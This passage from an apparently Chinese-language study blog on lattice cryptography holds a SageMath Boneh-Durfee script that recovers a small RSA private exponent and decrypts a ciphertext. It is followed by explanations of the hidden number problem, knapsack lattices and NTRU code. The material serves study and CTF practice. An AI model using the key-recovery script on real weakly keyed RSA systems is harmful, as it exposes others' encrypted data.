class="number">0</span>]):</span><br><span class="line">                    <span class="comment"># if it is affecting even one vector</span></span><br><span class="line">                    <span class="comment"># we give up on this one</span></span><br><span class="line">                    <span class="keyword">if</span> BB[kk, affected_vector_index] != <span class="number">0</span>:</span><br><span class="line">                        affected_deeper = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># remove both it if no other vector was affected and</span></span><br><span class="line">                <span class="comment"># this helpful vector is not helpful enough</span></span><br><span class="line">                <span class="comment"># compared to our unhelpful one</span></span><br><span class="line">                <span class="keyword">if</span> affected_deeper <span class="keyword">and</span> <span class="built_in">abs</span>(bound - BB[affected_vector_index, affected_vector_index]) &lt; <span class="built_in">abs</span>(</span><br><span class="line">                        bound - BB[ii, ii]):</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">&quot;* removing unhelpful vectors&quot;</span>, ii, <span class="string">&quot;and&quot;</span>, affected_vector_index)</span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii - <span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> BB</span><br><span class="line">    <span class="comment"># nothing happened</span></span><br><span class="line">    <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">* 0,0   if it fails</span></span><br><span class="line"><span class="string">* -1,-1 if `strict=true`, and determinant doesn&#x27;t bound</span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">boneh_durfee</span>(<span class="params">pol, modulus, mm, tt, XX, YY</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    finds a solution if:</span></span><br><span class="line"><span class="string">    * d &lt; N^delta</span></span><br><span class="line"><span class="string">    * |x| &lt; e^delta</span></span><br><span class="line"><span class="string">    * |y| &lt; e^0.5</span></span><br><span class="line"><span class="string">    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># substitution (Herrman and May)</span></span><br><span class="line">    PR.&lt;u,x,y&gt;= PolynomialRing(ZZ)</span><br><span class="line">    Q = PR.quotient(x * y + <span class="number">1</span> - u)  <span class="comment"># u = xy + 1</span></span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line"></span><br><span class="line">    UU = XX * YY + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(mm + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(mm - kk + <span class="number">1</span>):</span><br><span class="line">            xshift = x ^ ii * modulus ^ (mm - kk) * polZ(u, x, y) ^ kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts list of monomials</span></span><br><span class="line">    monomials = []</span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:</span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials():</span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:</span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># y-shifts (selected by Herrman and May)</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm / tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            yshift = y ^ jj * polZ(u, x, y) ^ kk * modulus ^ (mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift)  <span class="comment"># substitution</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># y-shifts list of monomials</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm / tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            monomials.append(u ^ kk * y ^ jj)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct lattice B</span></span><br><span class="line">    nn = <span class="built_in">len</span>(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, ii + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU, XX, YY)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Prototype to reduce the lattice</span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:</span><br><span class="line">        <span class="comment"># automatically remove</span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus ^ mm, nn - <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># reset dimension</span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;failure&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if vectors are helpful</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        helpful_vectors(BB, modulus ^ mm)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if determinant is correctly bounded</span></span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus ^ (mm * nn)</span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;We do not have det &lt; bound. Solutions might not be found.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Try with highers m and t.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;size det(L) - size e^(m*n) = &quot;</span>, floor(diff))</span><br><span class="line">        <span class="keyword">if</span> strict:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># display the lattice basis</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, modulus ^ mm)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span>)</span><br><span class="line"></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;LLL is done!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># transform vector i &amp; j -&gt; polynomials 1 &amp; 2</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;looking for independent vectors in the lattice&quot;</span>)</span><br><span class="line">    found_polynomials = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> <span class="built_in">range</span>(nn - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> <span class="built_in">range</span>(pol1_idx + <span class="number">1</span>, nn):</span><br><span class="line">            <span class="comment"># for i and j, create the two polynomials</span></span><br><span class="line">            PR.&lt;w,z&gt;= PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">                pol1 += monomials[jj](w * z + <span class="number">1</span>, w, z) * BB[pol1_idx, jj] / monomials[jj](UU, XX, YY)</span><br><span class="line">                pol2 += monomials[jj](w * z + <span class="number">1</span>, w, z) * BB[pol2_idx, jj] / monomials[jj](UU, XX, YY)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># resultant</span></span><br><span class="line">            PR.&lt;q&gt;= PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># are these good polynomials?</span></span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == [<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;found them, using vectors&quot;</span>, pol1_idx, <span class="string">&quot;and&quot;</span>, pol2_idx)</span><br><span class="line">                found_polynomials = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_polynomials:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;no independant vectors could be found. This should very rarely happen...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    rr = rr(q, q)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># solutions</span></span><br><span class="line">    soly = rr.roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(soly) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Your prediction (delta) is too small&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">return</span> solx, soly</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">example</span>():</span><br><span class="line">    <span class="comment">############################################</span></span><br><span class="line">    <span class="comment"># How To Use This Script</span></span><br><span class="line">    <span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># The problem to solve (edit the following values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the modulus</span></span><br><span class="line">    N = </span><br><span class="line">    <span class="comment"># the public exponent</span></span><br><span class="line">    e = </span><br><span class="line">    <span class="comment"># the cipher</span></span><br><span class="line">    c = </span><br><span class="line"></span><br><span class="line">    <span class="comment"># the hypothesis on the private exponent (the theoretical maximum is 0.292)</span></span><br><span class="line">    delta = <span class="number">.18</span>  <span class="comment"># this means that d &lt; N^delta</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Lattice (tweak those values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you should tweak this (after a first run), (e.g. increment it until a solution is found)</span></span><br><span class="line">    m = <span class="number">4</span>  <span class="comment"># size of the lattice (bigger the better/slower)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you need to be a lattice master to tweak these</span></span><br><span class="line">    t = <span class="built_in">int</span>((<span class="number">1</span> - <span class="number">2</span> * delta) * m)  <span class="comment"># optimization from Herrmann and May</span></span><br><span class="line">    X = <span class="number">2</span> * floor(N ^ delta)  <span class="comment"># this _might_ be too much</span></span><br><span class="line">    Y = floor(N ^ (<span class="number">1</span> / <span class="number">2</span>))  <span class="comment"># correct if p, q are ~ same size</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Don&#x27;t touch anything below</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Problem put in equation</span></span><br><span class="line">    P.&lt;x,y&gt;= PolynomialRing(ZZ)</span><br><span class="line">    A = <span class="built_in">int</span>((N + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">    pol = <span class="number">1</span> + x * (A + y)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Find the solutions!</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Checking bounds</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;=== checking values ===&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* delta:&quot;</span>, delta)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* delta &lt; 0.292&quot;</span>, delta &lt; <span class="number">0.292</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* size of e:&quot;</span>, <span class="built_in">int</span>(log(e) / log(<span class="number">2</span>)))</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* size of N:&quot;</span>, <span class="built_in">int</span>(log(N) / log(<span class="number">2</span>)))</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* m:&quot;</span>, m, <span class="string">&quot;, t:&quot;</span>, t)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># boneh_durfee</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;=== running algorithm ===&quot;</span>)</span><br><span class="line">        start_time = time.time()</span><br><span class="line"></span><br><span class="line">    solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># found a solution?</span></span><br><span class="line">    <span class="keyword">if</span> solx &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;=== solution found ===&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">False</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;x:&quot;</span>, solx)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;y:&quot;</span>, soly)</span><br><span class="line"></span><br><span class="line">        d = <span class="built_in">int</span>(pol(solx, soly) / e)</span><br><span class="line">        m = <span class="built_in">pow</span>(c, d, N)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;[-]d is &#x27;</span> + <span class="built_in">str</span>(d))</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;[-]m is: &#x27;</span> + <span class="built_in">str</span>(m))</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;[-]hex(m) is: &#x27;</span> + <span class="string">&#x27;&#123;:x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(m)))</span><br><span class="line">        <span class="comment"># print (&#x27;[-]str(m) is: &#x27; + &#x27;&#123;:x&#125;&#x27;.format(int(m)).decode(&#x27;hex&#x27;))</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;[!]no solution was found!&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;[!]All Done!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!]Timer: %s s&quot;</span> % (time.time() - start_time))</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;[!]All Done!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">example()</span><br></pre></td></tr></table></figure><h3 id="HNP-Hidden-number-problem"><a href="#HNP-Hidden-number-problem" class="headerlink" title="HNP (Hidden number problem)"></a>HNP (Hidden number problem)</h3><p>给定一个大质数 $p$ ，和许多 $t\in\mathbb{F_p}$ 和其对应的 $MSB_{l,p}(\alpha\cdot t)$ ，来找 $\alpha$。</p><blockquote><p>啥是 $MSB$ ？</p><p>$MSB_{l,p}(x)$ 表示的是任意一个满足 $|(x\ mod\ p)-u|\leq\frac{p}{2^{l+1}}$ 的 $u$ 。</p><p>也就是说， $MSB_{l,p}(x)$ 可以看成 $x\ mod\ p$ 的 $l$ 个有效高位。</p></blockquote><p>所以看起来是不是挺像 $A\cdot x+B$ ？所以我们或许可以简化这个问题。比方说把它变成下面这个问题：</p><p>如果我们有这些关系，并且有所有的 $A$ 和 $B$ ，来求最开始的 $x$。<br>$$<br>{\begin{cases}<br>A_1\times x+B_1&#x3D;y_1 \\<br>A_2\times y_1+B_2&#x3D;y_2 \\<br>\cdots \\<br>A_n\times y_{n-1}+B_x&#x3D;y_n<br>\end{cases}}<br>\pmod{m}<br>$$<br>当然这个 $x$ 是小于一个上限 $N$ （upper_bound）的。</p><p>多变量问题显然是困难的，为了减少变量，我们可以将这类关系进行迭代：<br>$$<br>y_2&#x3D;A_2\times y_1+B_2 \\<br>&#x3D;A_2\times(A_1\times x+B_1)+B_2 \\<br>&#x3D;A_1A_2\times x+A_2B_1+B_2 \\<br>&#x3D;A_2’\times x+B_2’<br>$$<br>所以这时，我们得到的就是关于唯一自变量 $x$ 的约束集了。那么我们将这个约束可以写成这样的矩阵：<br>$$<br>M&#x3D;{\begin{bmatrix}<br>m\\<br>&amp;m\\<br>&amp;&amp;\ddots\\<br>&amp;&amp;&amp;m\\<br>A_1&amp;A_2’&amp;\cdots&amp;A_n’&amp;1\\<br>B_1&amp;B_2’&amp;\cdots&amp;B_n’&amp;&amp;base\\<br>\end{bmatrix}}<br>$$<br>而此时一定有 $\vec{v}&#x3D;{\begin{bmatrix}k_1,k_2,\cdots,k_{n-1},x,1\end{bmatrix}}$ 能够满足 $\vec{v}\cdot M&#x3D;\vec{x}$ ：<br>$$<br>\vec{v}\cdot M<br>&#x3D;{\begin{bmatrix}k_1,k_2,\cdots,k_{n},x,1\end{bmatrix}}\cdot<br>{\begin{bmatrix}<br>m\\<br>&amp;m\\<br>&amp;&amp;\ddots\\<br>&amp;&amp;&amp;m\\<br>A_1&amp;A_2’&amp;\cdots&amp;A_n’&amp;1\\<br>B_1&amp;B_2’&amp;\cdots&amp;B_n’&amp;&amp;base\\<br>\end{bmatrix}}<br>&#x3D;{\begin{bmatrix}y_1,y_2,\cdots,y_n,x,base\end{bmatrix}}<br>&#x3D;\vec{x}<br>$$<br>那么只要格子构造和优化的足够优秀，LLL格基规约后即可找到这样的 $SVP$ 或者 $CVP$ 。</p><blockquote><p>举个栗子</p><p>倒数第二行是为了保证 $x$ 的大小与其他相同</p><p>倒数第一行是为了保证最后一行的向量只被加了一次</p></blockquote><h3 id="Knapsack-Lattice-0-amp-1knapsack-problem"><a href="#Knapsack-Lattice-0-amp-1knapsack-problem" class="headerlink" title="Knapsack (Lattice 0&amp;1knapsack problem)"></a>Knapsack (Lattice 0&amp;1knapsack problem)</h3><p>高纬度的背包问题，利用一个超级递增序列 $M$ 来表示明文，即</p><p>$$<br>C &#x3D; \sum_{i&#x3D;1}^{n}{mbin_i(0\ or\ 1)\times M_i}<br>$$<br>也可以这样理解： $\vec{C}&#x3D;\vec{m}\cdot\vec{M}$ ，当给出 $\vec{C}$ 与 $\vec{M}$ 时寻找合法的 $\vec{m}$ </p><p>《An Introduction to Mathematical Cryptography-Springer-Verlag》一书中提到LLL方式在背包问题中的应用中构造的格子如下<br>$$<br>B^{knapsack}<br>&#x3D;<br>{\begin{bmatrix}<br>2&amp;0&amp;0&amp;\cdots&amp;0&amp;m_1 \\<br>0&amp;2&amp;0&amp;\cdots&amp;0&amp;m_2 \\<br>0&amp;0&amp;2&amp;\cdots&amp;0&amp;m_3 \\<br>\vdots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots&amp;\vdots \\<br>0&amp;0&amp;0&amp;\cdots&amp;2&amp;m_n \\<br>1&amp;1&amp;1&amp;\cdots&amp;1&amp;C<br>\end{bmatrix}}<br>$$<br>LLL后得到的第一个向量取反加一再除2后得到的就是合法的 $\vec{m}$</p><p>但自己在私下想的时候似乎找到了一种另外的解，感觉是对的，但还没仔细证过，构造如下：<br>$$<br>B^{knapsack’}<br>&#x3D;<br>{\begin{bmatrix}<br>1&amp;0&amp;0&amp;\cdots&amp;0&amp;m_1 \\<br>0&amp;1&amp;0&amp;\cdots&amp;0&amp;m_2 \\<br>0&amp;0&amp;1&amp;\cdots&amp;0&amp;m_3 \\<br>\vdots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots&amp;\vdots \\<br>0&amp;0&amp;0&amp;\cdots&amp;1&amp;m_n \\<br>0&amp;0&amp;0&amp;\cdots&amp;0&amp;-C<br>\end{bmatrix}}<br>$$<br>无论选择哪种变换，一定存在一个 $\vec{x}&#x3D;{\begin{bmatrix}1&amp;1&amp;0&amp;\cdots&amp;0&amp;1&amp;\cdots\end{bmatrix}}$ 满足上述关系，并且应该也是最短的，如果做题的时候找到bug，这里还会回来补</p><h3 id="NTRU"><a href="#NTRU" class="headerlink" title="NTRU"></a>NTRU</h3><p>在讲NTRU之前，先说明几个工具</p><blockquote><p>一般 $n\in(250,2500)$</p><p><code>Zx.&lt;x&gt;</code>表示以 $x$ 为自变量的多项式，比如 $Zx([1,1,4,5,1,4])&#x3D;1\cdot x^5+1\cdot x^4+5\cdot x^3+4\cdot x^2+1\cdot x+1$</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Zx.&lt;x&gt;=ZZ[]</span><br></pre></td></tr></table></figure><h4 id="Cyclic-convolution"><a href="#Cyclic-convolution" class="headerlink" title="Cyclic convolution"></a>Cyclic convolution</h4><p>NTRU中的乘法运算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">convolution</span>(<span class="params">f,g</span>):</span><br><span class="line">    <span class="keyword">return</span> (f*g) % (x^n-<span class="number">1</span>)</span><br></pre></td></tr></table></figure><blockquote><p>这个循环是一个有趣的过程，你可以 通过给 $f(x)$ 乘 $x$ 的不同次方来达到旋转系数的目的</p></blockquote><h4 id="Modular-reduction"><a href="#Modular-reduction" class="headerlink" title="Modular reduction"></a>Modular reduction</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">balancedmod</span>(<span class="params">f,q</span>):</span><br><span class="line">    g = <span class="built_in">list</span>(((f[i] + q//<span class="number">2</span>) % q) - q//<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n))</span><br><span class="line">    <span class="keyword">return</span> Zx(g)</span><br></pre></td></tr></table></figure><blockquote><p>是一种特殊的规约（？</p><p>就是使一个多项式的所有系数 $x$ 满足 $x\in(-\frac{q}{2},\frac{q}{2})$ ，变相的模吧</p></blockquote><h4 id="Get-random-polynomials-with-d-nonzero-coefficients"><a href="#Get-random-polynomials-with-d-nonzero-coefficients" class="headerlink" title="Get random polynomials with d nonzero coefficients"></a>Get random polynomials with d nonzero coefficients</h4><p>获得一个只有d项非零系数的多项式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">randomdpoly</span>(<span class="params">d</span>):</span><br><span class="line">    <span class="keyword">assert</span> d &lt;= n</span><br><span class="line">    result = n*[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(d):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            r = randrange(n)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> result[r]: <span class="keyword">break</span></span><br><span class="line">        result[r] = <span class="number">1</span>-<span class="number">2</span>*randrange(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> Zx(result)</span><br></pre></td></tr></table></figure><h4 id="Division-modulo-primes"><a href="#Division-modulo-primes" class="headerlink" title="Division modulo primes"></a>Division modulo primes</h4><p>多项式下的对一个质数的倒数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">invertmodprime</span>(<span class="params">f,p</span>):</span><br><span class="line">  T = Zx.change_ring(Integers(p)).quotient(x^n - <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">return</span> Zx(lift(<span class="number">1</span> / T(f)))</span><br></pre></td></tr></table></figure><blockquote><p>简而言之 $f(x)\cdot invertmodprime(f(x),p)\equiv 1\pmod{p}$ （ $p$ 是一个质数）</p></blockquote><h4 id="Division-modulo-powers-of-2"><a href="#Division-modulo-powers-of-2" class="headerlink" title="Division modulo powers of 2"></a>Division modulo powers of 2</h4><p>（补上）非质数的倒数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">invertmodpowerof2</span>(<span class="params">f,q</span>):</span><br><span class="line">    <span class="keyword">assert</span> q.is_power_of(<span class="number">2</span>)</span><br><span class="line">    g = invertmodprime(f,<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = balancedmod(convolution(g,f),q)</span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">1</span>: <span class="keyword">return</span> g</span><br><span class="line">        g = balancedmod(convolution(g,<span class="number">2</span> - r),q)</span><br></pre></td></tr></table></figure><h4 id="Messages-for-encryption"><a href="#Messages-for-encryption" class="headerlink" title="Messages for encryption"></a>Messages for encryption</h4><p>随机一个多项式，系数 $x$ 满足 $x\in[1,0,-1]$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">randommessage</span>():</span><br><span class="line">    result = <span class="built_in">list</span>(randrange(<span class="number">3</span>) - <span class="number">1</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n))</span><br><span class="line">    <span class="keyword">return</span> Zx(result)</span><br></pre></td></tr></table></figure><h4 id="Encrypt"><a href="#Encrypt" class="headerlink" title="Encrypt"></a>Encrypt</h4><p>NTRU密码系统的加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">message,publickey</span>):</span><br><span class="line">    r = randomdpoly()</span><br><span class="line">    <span class="keyword">return</span> balancedmod(convolution(publickey,r) + message,q)</span><br></pre></td></tr></table></figure><h4 id="Decrypt"><a href="#Decrypt" class="headerlink" title="Decrypt"></a>Decrypt</h4><p>NTRU密码系统的解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">ciphertext,secretkey</span>):</span><br><span class="line">    f, f3 = secretkey</span><br><span class="line">    a = balancedmod(convolution(ciphertext,f),q)</span><br><span class="line">    <span class="keyword">return</span> balancedmod(convolution(a,f3),<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p><img src="/img/Lattice_learning/5.png" alt="Coppersmith"></p><p>加密解密的原理比较简单，这里就不再赘述，但是要注意如果参数大于了正常的解密范围，极有可能引起解密失败，但可以通过标准化 $q,n,d$ 来解决， $q$ 的选取越小越好，因为多项式的系数可以为 